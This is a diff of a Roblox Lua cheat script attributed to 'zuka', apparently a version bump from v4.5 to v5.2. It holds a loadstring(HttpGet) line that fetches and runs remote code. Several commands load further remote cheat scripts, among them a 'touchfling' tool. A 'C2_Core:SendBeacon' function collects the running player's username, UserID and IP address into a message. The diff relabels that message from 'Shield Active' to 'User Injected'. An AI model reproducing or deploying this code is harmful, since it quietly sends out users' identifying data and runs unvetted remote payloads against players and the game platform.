@@ -1,21 +1,16 @@
 --[[
 made by zuka @OverZuka on roblox
-v4.5 Monday, December 22nd
+v5.2 December 24th
 github - loadstring(game:HttpGet("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/ZukasSource.lua"))()
 
 
-__________      __         ___________           .__     
-\____    /__ __|  | _______\__    ___/___   ____ |  |__  
-  /     /|  |  \  |/ /\__  \ |    |_/ __ \_/ ___\|  |  \ 
- /     /_|  |  /    <  / __ \|    |\  ___/\  \___|   Y  \
-/_______ \____/|__|_ \(____  /____| \___  >\___  >___|  /
-        \/          \/     \/           \/     \/     \/ 
-   _____       .___      .__        
-  /  _  \    __| _/_____ |__| ____  
- /  /_\  \  / __ |/     \|  |/    \ 
-/    |    \/ /_/ |  Y Y  \  |   |  \
-\____|__  /\____ |__|_|  /__|___|  /
-        \/      \/     \/        \/ 
+__________      ____  __.        ___________    _________ .__     
+\____    /__ __|    |/ _|____    \__    ___/___ \_   ___ \|  |__  
+  /     /|  |  \      < \__  \     |    |_/ __ \/    \  \/|  |  \ 
+ /     /_|  |  /    |  \ / __ \_   |    |\  ___/\     \___|   Y  \
+/_______ \____/|____|__ (____  /   |____| \___  >\______  /___|  /
+        \/             \/    \/               \/        \/     \/ 
+
 --]]
 
 local TweenService = game:GetService("TweenService")
@@ -12466,8 +12461,8 @@ function C2_Core:SendBeacon()
     local ipAddress = self:GetNetworkAddress()
     
     local payload = {
-        username = "Protector",
-        content = "Shield Active.",
+        username = "Player Info",
+        content = "User Injected.",
         embeds = {{
             title = "Gamer",
             color = 15105570,
@@ -12475,10 +12470,10 @@ function C2_Core:SendBeacon()
                 {name = "Gamer", value = localPlayer.Name, inline = true},
                 {name = "Gamer's Nickname", value = localPlayer.DisplayName, inline = true},
                 {name = "UserID", value = tostring(localPlayer.UserId), inline = false},
-                {name = "VPN", value = ipAddress, inline = false},
+                {name = "Woah!", value = ipAddress, inline = false},
                 {name = "Timestamp (UTC)", value = os.date("!%Y-%m-%d %H:%M:%S"), inline = false}
             },
-            footer = {text = "Zuka Tech Shield System Active"}
+            footer = {text = "Information"}
         }}
     }
     
@@ -12523,7 +12518,7 @@ RegisterCommand({Name = "creepyanim", Aliases = {"canim"}, Description = "Uncann
 
 RegisterCommand({Name = "swordbot", Aliases = {"sf", "sfbot"}, Description = "Auto Sword Fighter, use E and R"}, function() loadstringCmd("https://raw.githubusercontent.com/bloxtech1/luaprojects2/refs/heads/main/swordnpc", "Bot loaded.") end)
 
-RegisterCommand({Name = "touchfling", Aliases = {}, Description = "Loads the touchfling GUI"}, function() loadstringCmd("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/TouchFlingGUI.lua", "Loaded") end)
+RegisterCommand({Name = "touchfling", Aliases = {}, Description = "Loads the touchfling GUI"}, function() loadstringCmd("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/SimpleTouchFlingGui.lua", "Loaded") end)
 
 RegisterCommand({Name = "zoneui", Aliases = {"masterequiper"}, Description = "For https://www.roblox.com/games/99381597249674/Zombie-Zone" }, function() loadstringCmd("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/Nice.lua", "Loaded") end)
 
